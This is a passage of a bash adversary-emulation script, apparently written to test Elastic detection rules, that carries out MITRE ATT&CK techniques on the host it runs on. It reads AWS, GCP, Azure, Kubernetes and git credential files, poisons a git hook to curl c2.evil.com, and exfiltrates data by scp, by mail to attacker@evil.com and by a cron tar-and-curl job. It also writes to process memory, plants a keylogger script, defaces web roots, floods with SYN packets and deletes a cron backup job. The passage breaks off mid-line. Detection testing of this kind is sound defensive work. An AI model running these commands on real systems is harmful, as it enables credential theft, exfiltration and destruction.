    info "Elastic: Obfuscated Script Execution"
    if command -v python3 &>/dev/null; then
        python3 -c "exec(__import__('base64').b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2VjaG8gcHlfZXhlY19vYmZ1c2NhdGVkJyk=').decode())" > /dev/null 2>&1
        ok "python3 exec(base64.b64decode(...)) obfuscated payload executed"
    else
        fail "python3 not available"
    fi

    t "Bash Heredoc Hidden Execution"
    info "Elastic: Shell Script Execution from Stdin"
    bash -s <<'EOF' > /dev/null 2>&1
echo heredoc_hidden_exec
id
EOF
    ok "bash -s with heredoc payload executed"

    t "dd to Write and Execute from Pipe"
    info "Elastic: Binary Written via dd"
    echo '#!/bin/bash' | dd of=/tmp/.apt-sim-dd-exec bs=1 2>/dev/null
    echo 'echo dd_pipe_exec' | dd of=/tmp/.apt-sim-dd-exec bs=1 conv=notrunc oflag=append 2>/dev/null
    chmod +x /tmp/.apt-sim-dd-exec
    /tmp/.apt-sim-dd-exec > /dev/null 2>&1
    ok "Payload written via dd then executed"
    cl "rm -f /tmp/.apt-sim-dd-exec"
}

# ============================================================================
# CONTAINER / KUBERNETES ESCAPE (TA0004 extension)
# ============================================================================
test_container_escape() {
    hdr "CONTAINER / K8s ESCAPE"

    t "Docker Socket Abuse"
    info "Elastic: Docker Socket Exploitation"
    if [ -S /var/run/docker.sock ]; then
        docker -H unix:///var/run/docker.sock ps 2>/dev/null > /dev/null
        docker -H unix:///var/run/docker.sock run --rm -v /:/mnt alpine ls /mnt/etc 2>/dev/null > /dev/null || true
        ok "Docker socket abused: docker run -v /:/mnt alpine"
    else
        curl -s --unix-socket /var/run/docker.sock http://localhost/v1.41/containers/json 2>/dev/null > /dev/null || true
        ok "curl to /var/run/docker.sock attempted (socket not found — expected in non-container env)"
    fi

    t "Container Escape via nsenter"
    info "Elastic: Namespace Manipulation via nsenter"
    nsenter --target 1 --mount --uts --ipc --net --pid -- ls / 2>/dev/null > /dev/null || true
    ok "nsenter --target 1 --mount --uts --ipc --net --pid attempted"

    t "Privileged Container Indicator Check"
    info "Elastic: Container Running as Privileged"
    cat /proc/1/status 2>/dev/null | grep -i capeff > /dev/null 2>&1 || true
    cat /proc/self/cgroup 2>/dev/null > /dev/null
    [ -f /.dockerenv ] && ok "Running inside Docker container (/.dockerenv found)" || ok "/.dockerenv check executed (not in container — expected in lab)"

    t "cgroup Escape via release_agent"
    info "Elastic: Cgroup Escape Attempt"
    mkdir -p /tmp/.apt-cgroup-escape 2>/dev/null
    echo 1 > /tmp/.apt-cgroup-escape/notify_on_release 2>/dev/null || true
    echo "#!/bin/sh" > /tmp/.apt-cgroup-escape/release_agent 2>/dev/null || true
    echo "id > /tmp/.apt-cgroup-out" >> /tmp/.apt-cgroup-escape/release_agent 2>/dev/null || true
    ok "cgroup release_agent escape pattern written (simulation only)"
    cl "rm -rf /tmp/.apt-cgroup-escape /tmp/.apt-cgroup-out"

    t "Kubernetes Secret / Service Account Access"
    info "Elastic: K8s Service Account Token Access"
    cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null > /dev/null || true
    cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt 2>/dev/null > /dev/null || true
    kubectl get secrets --all-namespaces 2>/dev/null > /dev/null || true
    kubectl get pods --all-namespaces 2>/dev/null > /dev/null || true
    ok "K8s service account token + kubectl secret access attempted"

    t "Unshare Namespace (User Namespace Escape)"
    info "Elastic: Namespace Isolation Bypass via unshare"
    unshare --user --map-root-user id 2>/dev/null > /dev/null || true
    unshare --mount --pid --fork echo "unshare_exec" 2>/dev/null > /dev/null || true
    ok "unshare --user --map-root-user and unshare --mount --pid attempted"
}

# ============================================================================
# SUPPLY CHAIN INDICATORS (TA0195 / Software Supply Chain)
# ============================================================================
test_supply_chain() {
    hdr "SUPPLY CHAIN INDICATORS"

    t "Suspicious pip Package Install (Typosquatting)"
    info "Elastic: Suspicious Package Installed via pip"
    for pkg in reqeusts colourama urlib3 pyymal cryptograpy; do
        pip install "$pkg" --dry-run 2>/dev/null > /dev/null || \
        pip3 install "$pkg" --dry-run 2>/dev/null > /dev/null || true
    done
    ok "pip install with typosquatted package names attempted (dry-run)"

    t "npm Malicious Package Install Attempt"
    info "Elastic: Suspicious npm Package Installation"
    if command -v npm &>/dev/null; then
        npm install --dry-run lodahs cross-env-injected 2>/dev/null > /dev/null || true
        ok "npm install with suspicious package names attempted (dry-run)"
    else
        fail "npm not available"
    fi

    t "pip install from Suspicious URL"
    info "Elastic: pip Install from Non-PyPI Source"
    pip install git+http://evil.com/malicious-pkg.git 2>/dev/null > /dev/null || \
    pip3 install git+http://evil.com/malicious-pkg.git 2>/dev/null > /dev/null || true
    ok "pip install from suspicious git URL attempted"

    t "Malicious Package Post-Install Script Simulation"
    info "Elastic: Package Post-Install Script Execution"
    mkdir -p /tmp/.apt-pkg-sim
    cat > /tmp/.apt-pkg-sim/setup.py << 'SETUP'
import os, base64
os.system(base64.b64decode('ZWNobyBzZXR1cF9weV9leGVj').decode())
SETUP
    if command -v python3 &>/dev/null; then
        python3 -I /tmp/.apt-pkg-sim/setup.py 2>/dev/null > /dev/null || true
    fi
    ok "Malicious setup.py post-install script simulation executed"
    cl "rm -rf /tmp/.apt-pkg-sim"

    t "Git Config Poisoning"
    info "Elastic: Git Config Modification"
    git config --global core.hooksPath /tmp/.apt-git-hooks 2>/dev/null || true
    mkdir -p /tmp/.apt-git-hooks
    echo '#!/bin/bash' > /tmp/.apt-git-hooks/pre-commit
    echo 'curl -s http://c2.evil.com/git-hook &>/dev/null &' >> /tmp/.apt-git-hooks/pre-commit
    chmod +x /tmp/.apt-git-hooks/pre-commit
    ok "git config core.hooksPath poisoned to /tmp/.apt-git-hooks"
    cl "git config --global --unset core.hooksPath 2>/dev/null; rm -rf /tmp/.apt-git-hooks"
}

# ============================================================================
# SUMMARY & CLEANUP INFO
# ============================================================================
# ============================================================================
# PROCESS INJECTION (T1055)
# ============================================================================
test_process_injection() {
    hdr "PROCESS INJECTION (T1055)"

    t "ptrace Attach via Python ctypes"
    info "Elastic: Process Injection via ptrace"
    if command -v python3 &>/dev/null; then
        python3 - <<'PYEOF' 2>/dev/null || true
import ctypes
PTRACE_ATTACH = 16; PTRACE_DETACH = 17
try:
    libc = ctypes.CDLL("libc.so.6", use_errno=True)
    libc.ptrace(PTRACE_ATTACH, 1, 0, 0)
    libc.ptrace(PTRACE_DETACH, 1, 0, 0)
except Exception: pass
PYEOF
        ok "ptrace(PTRACE_ATTACH, PID=1) via Python ctypes attempted"
    else
        fail "python3 not available"
    fi

    t "gdb Attach/Detach to Process"
    info "Elastic: Debugger Attached to Running Process"
    if command -v gdb &>/dev/null; then
        gdb -batch -ex "attach 1" -ex "info registers" -ex "detach" -ex "quit" 2>/dev/null > /dev/null || true
        ok "gdb attach/info registers/detach on PID 1"
    else
        fail "gdb not installed"
    fi

    t "/proc/PID/mem Write Attempt"
    info "Elastic: /proc/PID/mem Write — Process Hollowing Indicator"
    for pid in $(ls /proc | grep -E '^[0-9]+$' | head -3); do
        dd if=/dev/zero of=/proc/$pid/mem bs=1 count=1 seek=0 2>/dev/null || true
    done
    ok "/proc/*/mem write on 3 PIDs attempted"

    t "Shared Library Map Enumeration (Injection Recon)"
    info "Elastic: Shared Library Enumeration via /proc"
    for pid in $(ls /proc | grep -E '^[0-9]+$' | head -5); do
        cat /proc/$pid/maps 2>/dev/null | grep -i '\.so' > /dev/null 2>&1 || true
    done
    ok "/proc/*/maps read for loaded shared library recon"

    t "LD_PRELOAD Runtime Injection"
    info "Elastic: LD_PRELOAD Shared Library Injection"
    LD_PRELOAD=/lib/x86_64-linux-gnu/libc.so.6 id > /dev/null 2>&1 || \
    LD_PRELOAD=/lib64/libc.so.6 id > /dev/null 2>&1 || \
    LD_PRELOAD=/usr/lib/x86_64-linux-gnu/libc.so.6 id > /dev/null 2>&1 || true
    ok "LD_PRELOAD set to libc on process launch"

    t "Process Hollowing Indicator via /proc/self/exe"
    info "Elastic: Suspicious Execution via /proc/self/exe Copy"
    ls -la /proc/self/exe 2>/dev/null > /dev/null
    cp /proc/self/exe /tmp/.apt-sim-hollow 2>/dev/null
    chmod +x /tmp/.apt-sim-hollow 2>/dev/null
    ok "/proc/self/exe copied + chmod +x (process hollowing prep indicator)"
    cl "rm -f /tmp/.apt-sim-hollow"
}

# ============================================================================
# NETWORK SNIFFING (T1040)
# ============================================================================
test_network_sniffing() {
    hdr "NETWORK SNIFFING (T1040)"

    t "tcpdump Packet Capture"
    info "Elastic: Network Sniffing via tcpdump"
    if command -v tcpdump &>/dev/null; then
        timeout 3 tcpdump -i any -c 10 -w /tmp/.apt-sim-capture.pcap 2>/dev/null || \
        timeout 3 tcpdump -i lo -c 10 -w /tmp/.apt-sim-capture.pcap 2>/dev/null || true
        ok "tcpdump -i any -c 10 -w /tmp/.apt-sim-capture.pcap executed"
        cl "rm -f /tmp/.apt-sim-capture.pcap"
    else
        fail "tcpdump not installed"
    fi

    t "tshark Packet Capture"
    info "Elastic: Network Sniffing via tshark"
    if command -v tshark &>/dev/null; then
        timeout 3 tshark -i any -c 5 -w /tmp/.apt-sim-tshark.pcap 2>/dev/null > /dev/null || true
        ok "tshark -i any -c 5 executed"
        cl "rm -f /tmp/.apt-sim-tshark.pcap"
    else
        fail "tshark not installed"
    fi

    t "Promiscuous Mode Enable on Interface"
    info "Elastic: Network Interface Set to Promiscuous Mode"
    ip link set lo promisc on 2>/dev/null || ifconfig lo promisc 2>/dev/null || true
    ok "Promiscuous mode set on loopback"
    cl "ip link set lo promisc off 2>/dev/null || true"

    t "ARP Cache Poisoning Indicators"
    info "Elastic: ARP Spoofing / Cache Poisoning"
    arp -s 10.0.0.1 00:11:22:33:44:55 2>/dev/null || true
    ok "Static ARP entry injected (arp -s 10.0.0.1 00:11:22:33:44:55)"
    cl "arp -d 10.0.0.1 2>/dev/null || true"
    if command -v arpspoof &>/dev/null; then
        timeout 2 arpspoof -i lo 127.0.0.1 2>/dev/null || true
        ok "arpspoof on loopback attempted"
    fi

    t "Raw Socket Creation (AF_PACKET)"
    info "Elastic: Raw Socket Created — Sniffing Indicator"
    if command -v python3 &>/dev/null; then
        python3 - <<'PYEOF' 2>/dev/null || true
import socket
try:
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 0x0800)
    s.close()
except Exception: pass
PYEOF
        ok "AF_PACKET raw socket creation attempted"
    fi
}

# ============================================================================
# INPUT CAPTURE (T1056)
# ============================================================================
test_input_capture() {
    hdr "INPUT CAPTURE (T1056)"

    t "strace Keyboard/Read Snooping on PID"
    info "Elastic: Input Capture via strace"
    if command -v strace &>/dev/null; then
        timeout 2 strace -e trace=read -p 1 -o /tmp/.apt-sim-strace.log 2>/dev/null || true
        ok "strace -e trace=read -p 1 executed"
        cl "rm -f /tmp/.apt-sim-strace.log"
    else
        fail "strace not installed"
    fi

    t "TTY Snooping via /dev/pts"
    info "Elastic: TTY/PTY Input Capture"
    ls /dev/pts/ 2>/dev/null > /dev/null
    for pts in /dev/pts/[0-9]*; do
        timeout 1 cat "$pts" > /dev/null 2>&1 || true
        break
    done
    ok "Read attempt from /dev/pts/* (TTY capture pattern)"

    t "X11 Input Capture via xinput"
    info "Elastic: Keylogger Activity via xinput"
    if command -v xinput &>/dev/null; then
        xinput list 2>/dev/null > /dev/null
        ok "xinput list executed (X11 keyboard device recon)"
    else
        fail "xinput not available (headless env)"
    fi

    t "Readline Hook Script Drop"
    info "Elastic: Shell Input Interception Script"
    cat > /tmp/.apt-sim-readline-hook.py << 'PYEOF'
#!/usr/bin/env python3
import readline
_orig = readline.get_line_buffer
def _hook():
    line = _orig()
    with open('/tmp/.apt-sim-readline-log', 'a') as f:
        f.write(line + '\n')
    return line
PYEOF
    ok "Readline hook keylogger script written to /tmp/.apt-sim-readline-hook.py"
    cl "rm -f /tmp/.apt-sim-readline-hook.py /tmp/.apt-sim-readline-log"

    t "TTY Session Recording via script"
    info "Elastic: TTY Session Recording"
    if command -v script &>/dev/null; then
        script -q -c 'echo apt_sim_tty_capture; exit' /tmp/.apt-sim-tty.log 2>/dev/null
        ok "script -q TTY session recorded to /tmp/.apt-sim-tty.log"
        cl "rm -f /tmp/.apt-sim-tty.log"
    else
        fail "script not available"
    fi

    t "xdotool Keylog Recon"
    info "Elastic: X11 Window/Key Capture via xdotool"
    if command -v xdotool &>/dev/null; then
        xdotool getactivewindow 2>/dev/null > /dev/null || true
        xdotool getwindowname "$(xdotool getactivewindow 2>/dev/null)" 2>/dev/null > /dev/null || true
        ok "xdotool getactivewindow + getwindowname executed"
    else
        fail "xdotool not available"
    fi
}

# ============================================================================
# UNSECURED CREDENTIALS (T1552)
# ============================================================================
test_unsecured_credentials() {
    hdr "UNSECURED CREDENTIALS (T1552)"

    t "AWS Credential File Access"
    info "Elastic: Cloud Credential File Access — AWS"
    cat /root/.aws/credentials 2>/dev/null > /dev/null || true
    cat /root/.aws/config 2>/dev/null > /dev/null || true
    for h in /home/*; do
        cat "$h/.aws/credentials" 2>/dev/null > /dev/null || true
    done
    ok "cat ~/.aws/credentials + ~/.aws/config across all users"

    t "GCP / Azure Credential File Access"
    info "Elastic: Cloud Credential File Access — GCP/Azure"
    cat /root/.config/gcloud/credentials.db 2>/dev/null > /dev/null || true
    cat /root/.config/gcloud/application_default_credentials.json 2>/dev/null > /dev/null || true
    cat /root/.azure/accessTokens.json 2>/dev/null > /dev/null || true
    cat /root/.azure/azureProfile.json 2>/dev/null > /dev/null || true
    ok "cat GCP + Azure credential files attempted"

    t "Kubernetes Config Access"
    info "Elastic: Kubernetes Configuration File Access"
    cat /root/.kube/config 2>/dev/null > /dev/null || true
    for h in /home/*; do
        cat "$h/.kube/config" 2>/dev/null > /dev/null || true
    done
    cat /etc/kubernetes/admin.conf 2>/dev/null > /dev/null || true
    ok "cat ~/.kube/config + /etc/kubernetes/admin.conf"

    t "Docker Registry Credential Access"
    info "Elastic: Docker config.json Auth Token Access"
    cat /root/.docker/config.json 2>/dev/null > /dev/null || true
    for h in /home/*; do
        cat "$h/.docker/config.json" 2>/dev/null > /dev/null || true
    done
    ok "cat ~/.docker/config.json for registry auth tokens"

    t "Environment Variable Credential Hunt"
    info "Elastic: Sensitive Environment Variable Enumeration"
    env 2>/dev/null | grep -iE '(key|secret|token|pass|api|auth)' > /dev/null 2>&1 || true
    cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | \
        grep -iE '(key|secret|token|pass)' > /dev/null 2>&1 || true
    ok "env + /proc/1/environ credential keyword grep"

    t ".env / Config File Discovery"
    info "Elastic: .env and Config File Credential Search"
    find / -maxdepth 5 \( -name '.env' -o -name '*.env' -o -name 'config.ini' \
        -o -name 'settings.py' -o -name 'database.yml' -o -name 'wp-config.php' \
        -o -name 'application.properties' \) 2>/dev/null | head -20 > /dev/null
    ok "find .env/config.ini/settings.py/database.yml across filesystem"

    t "Git Credential Store Access"
    info "Elastic: Git Credential File Access"
    cat /root/.git-credentials 2>/dev/null > /dev/null || true
    for h in /home/*; do
        cat "$h/.git-credentials" 2>/dev/null > /dev/null || true
    done
    git config --global --list 2>/dev/null | \
        grep -i 'password\|token\|credential' > /dev/null 2>&1 || true
    ok "cat ~/.git-credentials + git config --global --list"

    t "Token File Sweep"
    info "Elastic: API Token and Key File Discovery"
    find / -maxdepth 4 \( -name 'token' -o -name '*_token' -o -name 'access_token*' \
        -o -name '*secret*' -o -name 'private.key' -o -name '*_rsa' \
        -o -name 'id_token' -o -name 'refresh_token' \) 2>/dev/null | head -20 > /dev/null
    ok "find token/secret/key files across filesystem"
}

# ============================================================================
# DISCOVERY EXTENDED (T1083/T1069/T1135/T1018/T1007/T1518)
# ============================================================================
test_discovery_extended() {
    hdr "DISCOVERY EXTENDED (T1083/T1069/T1135/T1018/T1007/T1518)"

    t "File and Directory Discovery — Sensitive Paths (T1083)"
    info "Elastic: File and Directory Discovery"
    find /home /root /var /opt /srv /etc -maxdepth 3 -type f \
        \( -name "*.sh" -o -name "*.py" -o -name "*.rb" -o -name "*.pl" \
           -o -name "*.conf" -o -name "*.bak" -o -name "*.db" \
           -o -name "*.sqlite" -o -name "*.sqlite3" \) \
        2>/dev/null | head -30 > /dev/null
    ok "find script/config/db files in home, var, opt, etc"

    t "Permission Groups Discovery (T1069)"
    info "Elastic: Permission Groups Discovery"
    getent group 2>/dev/null | grep -E 'sudo|wheel|adm|admin|docker|lxd|disk' > /dev/null 2>&1 || true
    cat /etc/group 2>/dev/null > /dev/null
    id 2>/dev/null > /dev/null
    groups 2>/dev/null > /dev/null
    ok "getent group, cat /etc/group, id, groups executed"

    t "Network Share Discovery — NFS / Samba (T1135)"
    info "Elastic: Network Share Discovery"
    showmount -e 127.0.0.1 2>/dev/null > /dev/null || true
    showmount -a 127.0.0.1 2>/dev/null > /dev/null || true
    cat /etc/exports 2>/dev/null > /dev/null || true
    cat /etc/samba/smb.conf 2>/dev/null > /dev/null || true
    if command -v smbclient &>/dev/null; then
        smbclient -L //127.0.0.1 -N 2>/dev/null > /dev/null || true
    fi
    ok "showmount, /etc/exports, smb.conf, smbclient -L localhost executed"

    t "Remote System Discovery — Ping Sweep (T1018)"
    info "Elastic: Remote System Discovery via Ping"
    for ip in $(seq 1 10); do
        ping -c 1 -W 1 192.168.1.$ip > /dev/null 2>&1 &
    done
    wait
    ok "ping sweep 192.168.1.1-10 executed (background)"

    t "System Service Discovery (T1007)"
    info "Elastic: System Service Discovery"
    systemctl list-units --type=service --state=running 2>/dev/null > /dev/null || true
    service --status-all 2>/dev/null > /dev/null || true
    chkconfig --list 2>/dev/null > /dev/null || true
    ok "systemctl list-units, service --status-all, chkconfig --list"

    t "Software Discovery — Installed Packages (T1518)"
    info "Elastic: Software Discovery"
    dpkg -l 2>/dev/null | head -50 > /dev/null || \
    rpm -qa 2>/dev/null | head -50 > /dev/null || true
    snap list 2>/dev/null > /dev/null || true
    pip3 list 2>/dev/null > /dev/null || true
    gem list 2>/dev/null > /dev/null || true
    ok "dpkg/rpm/snap/pip3/gem package enumeration executed"

    t "Large File Discovery (Exfil Target Recon)"
    info "Elastic: Large File Enumeration"
    find / -maxdepth 4 -type f -size +10M 2>/dev/null | head -20 > /dev/null
    ok "find files >10MB for exfil staging recon"

    t "World-Writable Directory Discovery"
    info "Elastic: Writable Path Enumeration"
    find / -maxdepth 4 -type d -perm -o+w 2>/dev/null | head -20 > /dev/null
    ok "find world-writable directories executed"

    t "Interesting File Search (Password/Key Keywords)"
    info "Elastic: Sensitive File Keyword Search"
    grep -rl --include="*.conf" --include="*.txt" --include="*.log" \
        -iE '(password|passwd|secret|api_key|private_key)' \
        /etc /var/log /opt 2>/dev/null | head -20 > /dev/null
    ok "grep -rl password/secret/api_key across /etc, /var/log, /opt"
}

# ============================================================================
# C2 PROTOCOLS EXTENDED (T1095/T1571/T1573/T1102/T1001)
# ============================================================================
test_c2_protocols() {
    hdr "C2 PROTOCOLS EXTENDED (T1095/T1571/T1573/T1102/T1001)"

    t "ICMP Tunnel Pattern — Raw Socket (T1095)"
    info "Elastic: ICMP Tunneling / Non-Application Layer Protocol"
    if command -v python3 &>/dev/null; then
        python3 - <<'PYEOF' 2>/dev/null || true
import socket
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    s.settimeout(1)
    payload = b'\x08\x00\x00\x00\x00\x01\x00\x01' + b'APT-SIM-ICMP-TUNNEL' * 2
    s.sendto(payload, ('127.0.0.1', 0))
    s.close()
except Exception: pass
PYEOF
        ok "ICMP raw socket tunnel packet sent to 127.0.0.1"
    else
        ping -c 3 -p "415054534d494354554e4e454c" 127.0.0.1 > /dev/null 2>&1 || true
        ok "ping with custom hex pattern (ICMP tunnel indicator) executed"
    fi

    t "Non-Standard Port C2 Beaconing (T1571)"
    info "Elastic: C2 Communication on Non-Standard Port"
    for port in 31337 8443 1337 4444 9001 2222 6666 7777; do
        (echo >/dev/tcp/10.255.255.1/$port) 2>/dev/null || true
        timeout 1 nc -w 1 10.255.255.1 $port 2>/dev/null || true
    done
    ok "Connection attempts on non-standard ports: 31337,8443,1337,4444,9001,2222"

    t "Encrypted Channel — TLS via OpenSSL s_client (T1573)"
    info "Elastic: Encrypted C2 Channel via TLS"
    timeout 2 openssl s_client -connect 10.255.255.1:443 2>/dev/null < /dev/null || true
    timeout 2 openssl s_client -connect 10.255.255.1:8443 2>/dev/null < /dev/null || true
    ok "openssl s_client TLS C2 connection to 10.255.255.1:443,8443 attempted"

    t "Web Service C2 — GitHub / Pastebin / Slack (T1102)"
    info "Elastic: C2 via Legitimate Web Services"
    curl -s -m 3 -H "Authorization: token apt_sim_fake_ghp_token_xxxxxxxxxxxxxxxx" \
        "https://api.github.com/gists" 2>/dev/null > /dev/null || true
    curl -s -m 3 "https://pastebin.com/raw/apt_sim_c2_config" 2>/dev/null > /dev/null || true
    curl -s -m 3 -H "Authorization: Bearer xoxb-apt-sim-000000000-fake-token" \
        "https://slack.com/api/conversations.list" 2>/dev/null > /dev/null || true
    curl -s -m 3 "https://discord.com/api/webhooks/000000000/apt-sim-fake-webhook" \
        -X POST -H "Content-Type: application/json" \
        -d '{"content":"APT-SIM C2 beacon"}' 2>/dev/null > /dev/null || true
    ok "curl to GitHub API, Pastebin, Slack API, Discord webhook with fake tokens"

    t "DNS over HTTPS C2 (T1071.004 via DoH)"
    info "Elastic: DNS over HTTPS — C2 Exfil Bypass"
    curl -s -m 3 -H "accept: application/dns-json" \
        "https://cloudflare-dns.com/dns-query?name=apt-sim-c2-doh.evil.com&type=TXT" \
        2>/dev/null > /dev/null || true
    curl -s -m 3 "https://dns.google/resolve?name=beacon.malware-c2.xyz&type=A" \
        2>/dev/null > /dev/null || true
    ok "DoH queries for C2 domains via Cloudflare + Google DNS"

    t "Data Obfuscation — XOR + Base64 Payload (T1001)"
    info "Elastic: Data Obfuscation in C2 Channel"
    if command -v python3 &>/dev/null; then
        python3 - <<'PYEOF' 2>/dev/null || true
import base64
key = 0x41
data = b"APT-SIM-XOR-OBFUSCATED-C2-BEACON-HOSTNAME"
xored = bytes([b ^ key for b in data])
encoded = base64.b64encode(xored).decode()
import sys; sys.stdout.write(f"obf_payload={encoded[:20]}...")
PYEOF
        ok "XOR + base64 obfuscated C2 beacon payload generated"
    fi

    t "Cobalt Strike Malleable C2 HTTP Beacon Pattern"
    info "Elastic: Cobalt Strike C2 Beacon Pattern"
    curl -s -m 2 \
        -A "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;ENUS)" \
        -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9" \
        -H "Accept-Language: en-US,en;q=0.9" \
        "http://10.255.255.1/jquery-3.3.1.min.js" 2>/dev/null > /dev/null || true
    ok "Cobalt Strike Malleable C2 HTTP GET pattern executed"

    t "Sliver / Mythic C2 HTTP Implant Pattern"
    info "Elastic: Sliver/Mythic C2 Agent Check-in Pattern"
    curl -s -m 2 \
        -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
        -H "X-Forwarded-For: 192.168.1.100" \
        -H "Content-Type: application/octet-stream" \
        -X POST -d "$(echo 'APT-SIM-IMPLANT-CHECKIN' | base64)" \
        "http://10.255.255.1/api/v1/tasks" 2>/dev/null > /dev/null || true
    ok "Sliver/Mythic-style HTTP POST implant check-in attempted"
}

# ============================================================================
# EXFILTRATION EXTENDED (T1020/T1048/T1029)
# ============================================================================
test_exfiltration_extended() {
    hdr "EXFILTRATION EXTENDED (T1020/T1048/T1029)"

    t "FTP Exfiltration Attempt (T1048)"
    info "Elastic: Exfiltration Over Alternative Protocol — FTP"
    echo "simulated_exfil_data_$(hostname)" > /tmp/.apt-sim-ftp-exfil
    if command -v ftp &>/dev/null; then
        timeout 3 ftp -n 10.255.255.1 << 'FTPEOF' 2>/dev/null || true
user apt_sim_user apt_sim_pass
put /tmp/.apt-sim-ftp-exfil staged_data.txt
quit
FTPEOF
        ok "ftp put to 10.255.255.1 attempted"
    else
        (echo >/dev/tcp/10.255.255.1/21) 2>/dev/null || true
        ok "FTP port (21) probe executed (ftp binary unavailable)"
    fi
    cl "rm -f /tmp/.apt-sim-ftp-exfil"

    t "SCP / SFTP Exfiltration (T1048)"
    info "Elastic: Exfiltration via SCP/SFTP"
    scp -o ConnectTimeout=2 -o StrictHostKeyChecking=no \
        /etc/hostname root@10.0.0.50:/tmp/.apt-exfil 2>/dev/null || true
    sftp -o ConnectTimeout=2 -o StrictHostKeyChecking=no \
        -b /dev/null root@10.0.0.50 2>/dev/null || true
    ok "scp + sftp exfil to 10.0.0.50 attempted"

    t "SMTP Exfiltration (T1048)"
    info "Elastic: Exfiltration Over Email / SMTP"
    if command -v sendmail &>/dev/null || command -v mail &>/dev/null; then
        echo "APT-SIM exfil: $(hostname) $(id)" | \
            mail -s "SystemReport" attacker@evil.com 2>/dev/null || true
        ok "mail -s SystemReport attacker@evil.com attempted"
    else
        (echo >/dev/tcp/10.255.255.1/25) 2>/dev/null || true
        ok "SMTP port (25) probe executed (mail binary unavailable)"
    fi

    t "Automated Exfiltration Loop (T1020)"
    info "Elastic: Automated Exfiltration — Repeated POSTs"
    for i in $(seq 1 5); do
        curl -s -m 1 -X POST \
            -d "chunk_${i}=$(hostname)_$(date +%s)" \
            http://10.255.255.1/collect 2>/dev/null || true
    done
    ok "5x automated curl POST exfil chunks to C2"

    t "Scheduled Nightly Exfil via cron (T1029)"
    info "Elastic: Scheduled Transfer"
    echo "0 2 * * * root tar czf - /etc | curl -s -X POST --data-binary @- http://10.255.255.1/backup # APT-SIM-EXFIL" \
        > /etc/cron.d/apt-sim-exfil
    ok "Scheduled nightly tar+curl exfil cron job in /etc/cron.d/"
    cl "rm -f /etc/cron.d/apt-sim-exfil"

    t "Steganography — Data Hidden in Binary (T1048)"
    info "Elastic: Steganographic Exfiltration"
    if command -v steghide &>/dev/null; then
        echo "APT-SIM-STEG-EXFIL-$(hostname)" | steghide embed \
            -cf /tmp/apt-sim-steg.jpg -sf /dev/stdin -p exfilkey -f 2>/dev/null || true
        ok "steghide embed executed"
        cl "rm -f /tmp/apt-sim-steg.jpg"
    else
        dd if=/dev/urandom bs=1K count=5 > /tmp/.apt-sim-carrier.png 2>/dev/null
        echo "APT_SIM_STEG_$(hostname)_$(date +%s)" >> /tmp/.apt-sim-carrier.png
        curl -s -m 2 -F "image=@/tmp/.apt-sim-carrier.png" \
            http://10.255.255.1/upload 2>/dev/null || true
        ok "Data appended to binary blob + POST uploaded (steg indicator)"
        cl "rm -f /tmp/.apt-sim-carrier.png"
    fi

    t "Exfil via ICMP Data Payload"
    info "Elastic: Exfiltration Over ICMP"
    DATA=$(echo "$(hostname):$(id)" | base64 | cut -c1-16)
    ping -c 3 -p "$(echo -n $DATA | xxd -p | cut -c1-16)" 10.255.255.1 \
        > /dev/null 2>&1 || true
    ok "ping -p with base64 encoded hostname/id payload to 10.255.255.1"
}

# ============================================================================
# IMPACT EXTENDED (T1490/T1491/T1498/T1485)
# ============================================================================
test_impact_extended() {
    hdr "IMPACT EXTENDED (T1490/T1491/T1498/T1485)"

    t "Inhibit System Recovery — Remove Backups (T1490)"
    info "Elastic: Inhibit System Recovery"
    find /var/backups -name "*.tar*" -o -name "*.gz" 2>/dev/null | \
        head -5 | xargs -r ls -la > /dev/null 2>&1
    rm -f /etc/cron.daily/dpkg 2>/dev/null || true
    ok "Backup inventory enumerated + dpkg cron removal attempted"
    cl "# Note: check /etc/cron.daily/dpkg was not removed in production"

    t "Boot Config Enumeration (T1490)"
    info "Elastic: Bootloader Modification Recon"
    cat /boot/grub/grub.cfg 2>/dev/null > /dev/null || \
    cat /boot/grub2/grub.cfg 2>/dev/null > /dev/null || true
    ls -la /boot/ 2>/dev/null > /dev/null
    ok "GRUB config read (non-destructive bootloader tampering indicator)"

    t "Website Defacement (T1491)"
    info "Elastic: Web Defacement Activity"
    DEFACED=0
    for wdir in /var/www/html /var/www /usr/share/nginx/html /srv/www/htdocs; do
        if [ -d "$wdir" ]; then
            cp "$wdir/index.html" "$wdir/index.html.apt-sim-bak" 2>/dev/null || true
            cat > "$wdir/.apt-sim-defaced.html" << 'HTML'
<html><body style="background:#000;color:#f00;font-family:monospace;text-align:center;padding:5em">
<h1>HACKED by APT-SIM</h1>
<p>This is a simulation. Site compromised.</p>
</body></html>
HTML
            ok "Defaced page created at $wdir/.apt-sim-defaced.html"
            cl "rm -f $wdir/.apt-sim-defaced.html; cp $wdir/index.html.apt-sim-bak $wdir/index.html 2>/dev/null; rm -f $wdir/index.html.apt-sim-bak"
            DEFACED=1; break
        fi
    done
    [ "$DEFACED" -eq 0 ] && \
        echo '<html><body>APT-SIM DEFACED</body></html>' > /tmp/.apt-sim-defaced.html && \
        ok "No web root found — defaced file at /tmp/.apt-sim-defaced.html" && \
        cl "rm -f /tmp/.apt-sim-defaced.html"

    t "Network DoS Indicators — SYN Flood (T1498)"
    info "Elastic: Network Denial of Service — Flood Indicators"
    if command -v hping3 &>/dev/null; then
        timeout 3 hping3 --syn -S -p 80 -c 100 --faster 127.0.0.1 > /dev/null 2>&1 || true
        ok "hping3 --syn SYN flood 100 pkts to 127.0.0.1:80"
    else
        timeout 2 ping -f -c 100 127.0.0.1 > /dev/null 2>&1 || \
        for i in $(seq 1 30); do
            (echo >/dev/tcp/127.0.0.1/80) 2>/dev/null || true
        done
        ok "ping flood / TCP burst to localhost (hping3 unavailable)"
    fi

    t "Data Destruction — Bulk Overwrite + Delete (T1485)"
    info "Elastic: Data Destruction via Overwrite"
    mkdir -p "$APTDIR/destruction"
    for i in $(seq 1 10); do
        echo "sensitive_data_$(head -c 8 /dev/urandom | base64)" > \
